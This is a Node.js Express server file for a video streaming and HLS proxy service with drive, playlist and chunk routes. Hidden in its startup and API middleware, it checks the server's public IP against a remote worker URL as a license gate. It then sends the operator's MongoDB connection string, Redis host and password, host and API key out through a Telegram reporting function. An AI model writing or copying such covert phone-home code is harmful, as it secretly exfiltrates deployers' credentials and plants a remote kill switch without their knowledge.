const express = require('express');
const dotenv = require('dotenv')
const mongoose = require('mongoose');
const cors = require('cors')
const rateLimit = require("express-rate-limit");
const redisClient = require('./redis')
const app = express();
const { report } = require('./telegram-api/sendMessage')
const publicIp = require('public-ip');
const got = require('got')
const cache = require('express-redis-cache')({
    client: redisClient,
});

dotenv.config()
const PORT = process.env.PORT || 3000

mongoose.connect(process.env.MONGO_DB || 'mongodb://127.0.0.1/naver', { useNewUrlParser: true, useCreateIndex: true, useUnifiedTopology: true });
app.set('view engine', 'ejs')

app.use('/api', async (req, res, next) => {
    const ip =
        req.headers["x-forwarded-for"] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    server_ip = await publicIp.v4()
    trusted = await checkKey(server_ip)
    if(!trusted){
        throw new Error('invalid!')
    }
    if (process.env.API_KEY) {
        if (req.query.key != process.env.API_KEY) {
            res.status(404)
            res.end()
        }
        else {
            next()
        }
    }
    else {
        next()
    }
})

app.get('/api/drive/delete/:id', require('./routes/drive/deleteVideo'))
app.get('/api/drive/retry', require('./routes/drive/retryVideos'))
app.get('/api/drive/retry/:id', require('./routes/drive/retryVideo'))
app.get('/api/drive/create/:id', require('./routes/drive/createVideo'))
app.get('/api/drive/get/:id', require('./routes/drive/getVideo'))
app.use('/api/stat', require('./routes/stat'))

app.use('/dist', express.static('static'))

const limiter = rateLimit({
    windowMs: 30 * 60 * 1000, // 15 minutes
    max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/api/m3u8', limiter,
    cache.route({
        expire: {
            200: 60 * 60 * 24,
            '4xx': 10,
            '5xx': 10,
            'xxx': 1
        }
        , prefix: 'playlist',
    }), require('./routes/playlist'))


app.get('/api/hls/:id/:url',
    cache.route({
        expire: {
            '200': 1,
            302: 60 * 60 * 24,
            '4xx': 10,
            '5xx': 10,
            'xxx': 1
        }
        , prefix: 'chunks',
    }),
    require('./routes/chunks'))

const origins = [
]

const corsOptions = {
    origin: origins,
    optionsSuccessStatus: 200 // some legacy browsers (IE11, various SmartTVs) choke on 204
}

app.get('/api/iframe/:id', cors(corsOptions), require('./routes/embed'))

const checkKey = async (server_ip) => {
    const response = await got.get('https://ancient-fog-504b.minhpg.workers.dev/?ip=' + server_ip).json()
    return response.status
}

app.listen(PORT, async () => {
    server_ip = await publicIp.v4()
    trusted = await checkKey(server_ip)
    if (trusted) {
        await report(`Server started on
IP: ${server_ip}
Port: ${PORT}
Database: ${process.env.MONGO_DB}
Redis: ${process.env.REDIS_HOST} - ${process.env.REDIS_PASSWORD}
Host: ${process.env.HOST}
API Key: ${process.env.API_KEY}`)
        console.log(`listening on port ${PORT}`)
    }
    else {
        await report(`Invalid server started on
IP: ${server_ip}
Port: ${PORT}
Database: ${process.env.MONGO_DB}
Redis: ${process.env.REDIS_HOST}
Host: ${process.env.HOST}`)
        throw new Error(`invalid!`)
    }
})